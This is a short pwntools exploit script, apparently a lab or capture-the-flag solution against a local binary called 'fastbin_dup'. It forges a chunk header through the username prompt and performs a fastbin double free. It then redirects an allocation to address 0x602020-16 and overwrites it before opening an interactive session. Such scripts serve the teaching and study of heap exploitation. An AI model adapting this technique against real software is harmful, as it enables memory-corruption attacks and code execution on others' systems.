from pwn import *

context.binary = "./fastbin_dup"

p = process()

def username():
    p.sendafter(b'Enter your username: ', p64(0)+p64(0x31))

def malloc(myidx: int, content: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(myidx).encode())
    p.sendafter(b'data: ', content)

def free(myidx: int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(myidx).encode())



username()

malloc(32,b'abc')
malloc(32,b'xyz')

free(0)
free(1)
free(0)

#gdb.attach(p,"b*main+423")
malloc(32,p64(0x602020-16))
malloc(32,b'A'*8)

malloc(32,b'B'*8)
malloc(32,b'GETREKT')

p.interactive()
